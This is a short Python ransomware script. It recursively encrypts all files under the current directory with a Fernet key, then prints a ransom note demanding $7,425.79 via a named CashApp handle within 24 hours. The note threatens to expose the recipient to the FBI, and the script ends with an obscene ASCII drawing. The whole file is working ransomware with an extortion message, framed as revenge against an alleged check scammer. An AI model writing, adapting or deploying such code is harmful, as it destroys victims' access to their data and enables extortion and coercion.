#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# Function to find all files in a directory
def find_files(directory):
    files = []
    for root, dirs, file_list in os.walk(directory):
        for file_name in file_list:
            if file_name in ["main.py", "thekey.key", "decrypt.py"]:
                continue
            files.append(os.path.join(root, file_name))
    return files

# Ensure current directory is included
current_directory = os.getcwd()

# Finding all files starting from current directory
files = find_files(current_directory)

print("Files to be encrypted:", files)

# Generating a key
key = Fernet.generate_key()

# Saving the key to a file
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

# Encrypting all the files
for file in files:
    try:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
        print(f"Encrypted {file}")
    except Exception as e:
        print(f"Skipping file {file} due to {e}")

print("Encryption process completed.")





print("Didnt your mom ever tell you to not scam innocent people?")
print("All of your files have been encrypted. You will cashapp me ($SBussisoDube) the ammount you have written for the fraudulent check you sent me via email ($7,425.79 USD)")
print("not only are your files encrypted I also have information on who you are and your real location despite your efforts to hide them")
print("You are smart but I am smarter")
print("if you fail to do so I will hand everything over to the FBI including your real identity and location which will then be handled by the proper authorities to reach you.")
print("you have 24 hours to respond")
print("you will respond via the same email thread you sent the counterfit check")
print("failure to respond as instructed will result in total system termination")
bird = """

░░░░░░░░░░░░░░░▄▄░░░░░░░░░░░
░░░░░░░░░░░░░░█░░█░░░░░░░░░░
░░░░░░░░░░░░░░█░░█░░░░░░░░░░
░░░░░░░░░░░░░░█░░█░░░░░░░░░░
░░░░░░░░░░░░░░█░░█░░░░░░░░░░
██████▄███▄████░░███▄░░░░░░░
▓▓▓▓▓▓█░░░█░░░█░░█░░░███░░░░
▓▓▓▓▓▓█░░░█░░░█░░█░░░█░░█░░░
▓▓▓▓▓▓█░░░░░░░░░░░░░░█░░█░░░
▓▓▓▓▓▓█░░░░░░░░░░░░░░░░█░░░░
▓▓▓▓▓▓█░░░░░░░░░░░░░░██░░░░░
▓▓▓▓▓▓█████░░░░░░░░░██░░░░░
█████▀░░░░▀▀████████░░░░░░


"""
print(bird)